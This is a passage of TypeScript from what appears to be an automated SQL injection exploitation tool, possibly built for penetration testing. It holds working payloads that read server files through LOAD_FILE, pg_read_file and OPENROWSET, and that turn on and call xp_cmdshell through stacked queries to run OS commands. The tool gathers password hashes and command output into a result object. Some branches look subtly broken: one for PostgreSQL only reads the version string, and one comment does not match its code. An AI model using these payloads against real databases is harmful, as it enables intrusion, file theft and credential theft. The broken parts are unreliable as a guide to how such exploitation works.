                content = await extractExpr(`LOAD_FILE('${filePath}')`, `file-read`);
            } else if (dbmsFamily === 'postgresql') {
                content = await extractExpr(`pg_read_file('${filePath}', 0, 1024)`, `file-read`);
            } else if (dbmsFamily === 'mssql') {
                // Use xp_cmdshell to read file (requires sysadmin)
                if (isDbAdmin) {
                    content = await extractExpr(
                        `(SELECT TOP 1 col FROM OPENROWSET(BULK '${filePath}', SINGLE_CLOB) AS x(col))`,
                        `file-read`,
                    );
                }
            }

            filesRead.push({
                path: filePath,
                content: content || '',
                success: !!content,
            });
        }
    }

    // ── Phase 9: OS Command Execution (safe commands only) ────
    let osCommands: OsCommandResult[] | undefined;

    // Only attempt safe, evidence-gathering commands
    const safeCommands = ['whoami', 'hostname', 'id'];

    if (isDbAdmin) {
        osCommands = [];
        for (const cmd of safeCommands) {
            let output = '';

            if (dbmsFamily === 'mssql') {
                // Enable xp_cmdshell and execute
                await exploitRequest(url, method, paramName, injPoint,
                    `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -`,
                    config);
                output = await extractExpr(`(SELECT TOP 1 output FROM (SELECT ROW_NUMBER() OVER(ORDER BY (SELECT 1)) AS rn, output FROM sys.dm_exec_input_buffer(@@SPID, NULL)) t WHERE rn=1)`, `os-cmd-${cmd}`);
                if (!output) {
                    // Alternative: direct xp_cmdshell
                    const cmdPayload = `'; DECLARE @r VARCHAR(8000); SET @r=''; EXEC xp_cmdshell '${cmd}'; SELECT @r-- -`;
                    const cmdRes = await exploitRequest(url, method, paramName, injPoint, cmdPayload, config);
                    if (cmdRes) output = cmdRes.body.slice(0, 500);
                }
            } else if (dbmsFamily === 'mysql') {
                // MySQL UDF or sys_exec (if available)
                output = await extractExpr(`sys_exec('${cmd}')`, `os-cmd-${cmd}`);
            } else if (dbmsFamily === 'postgresql') {
                // PostgreSQL COPY or system commands
                output = await extractExpr(`(SELECT string_agg(line, E'\\n') FROM (SELECT line FROM unnest(string_to_array((SELECT cmd FROM (SELECT CAST(COALESCE(version(),'') AS text) AS cmd) t), E'\\n')) AS line LIMIT 5) sub)`, `os-cmd-${cmd}`);
            }

            osCommands.push({
                command: cmd,
                output: output || '',
                success: !!output,
            });
        }
    }

    // ── Final: Build Result ───────────────────────────────────
    if (databases.length === 0 && !currentDatabase) return null;

    if (databases.length === 0 && currentDatabase) {
        databases.push({ name: currentDatabase, tables: [] });
    }

    // Collect privileges from user info
    let privileges: string[] | undefined;
    if (isDbAdmin !== undefined) {
        privileges = isDbAdmin ? ['SUPERUSER', 'DBA'] : ['STANDARD'];
    }

    return {
        dbms,
        dbmsFamily,
        dbmsVersion,
        technique: activeTechnique,
        currentDatabase,
        currentUser,
        hostname,
        dataDir,
        columnCount,
        injectableColumn,
        isDbAdmin,
        serverOs,
        privileges,
        databases,
        users,
        passwordHashes,
        filesRead,
        osCommands,
        testedTechniques,
        bannedTechniques: bannedTechniques.length > 0 ? bannedTechniques : undefined,
        exploitLog: log,
        startedAt,
        completedAt: Date.now(),
    };
}